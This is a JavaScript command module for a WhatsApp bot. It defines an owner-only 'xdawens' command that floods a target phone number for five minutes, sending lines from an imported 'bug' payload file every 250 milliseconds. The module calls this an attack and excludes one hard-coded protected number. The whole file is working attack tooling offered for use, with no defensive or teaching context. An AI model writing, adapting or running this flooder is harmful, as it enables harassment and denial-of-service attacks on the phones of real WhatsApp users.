const { cmd } = require('../command');
const config = require('../config');
const bugchat = require('../../bug/izuka5.js'); // Payload la

cmd({
  pattern: 'xdawens',
  desc: 'Owner-only command to spam bug messages continuously for 5 minutes',
  category: 'bug',
  react: '🛠️',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const allowedUsers = [
      botNumber,
      config.OWNER_NUMBER + '@s.whatsapp.net',
      ...(config.SUDO || []).map(n => n + '@s.whatsapp.net'),
    ];
    const protectedNumbers = ['13058962443'];

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'xdawens') return;

    if (!allowedUsers.includes(senderId)) {
      return await bot.sendMessage(from, { text: '*🚫 This command is for owner only.*' }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}xdawens <number>`
      }, { quoted: mek });
    }

    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected and cannot be targeted.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const lines = bugchat.split('\n').filter(Boolean);

    await bot.sendMessage(from, {
      text: `🚀 *XDAWENS Attack Initiated*\n📱 Target: +${targetNumber}\n⏳ Sending messages continuously for 5 minutes...`
    }, { quoted: mek });

    const startTime = Date.now();
    const duration = 5 * 60 * 1000; // 5 minutes

    while (Date.now() - startTime < duration) {
      for (let i = 0; i < lines.length; i++) {
        await bot.sendMessage(targetJid, {
          text: `⚠️ *XDAWENS PACKET #${i + 1}*\n${lines[i]}\n\n🛠️ _XDAWENS BUG ENGINE_`
        });
        await new Promise(r => setTimeout(r, 250)); // delay 250ms
      }
    }

    await bot.sendMessage(from, {
      text: `✅ *XDAWENS attack finished after 5 minutes on* +${targetNumber}.`
    }, { quoted: mek });

  } catch (error) {
    console.error(error);
    reply(`❌ Error: ${error.message}`);
  }
});
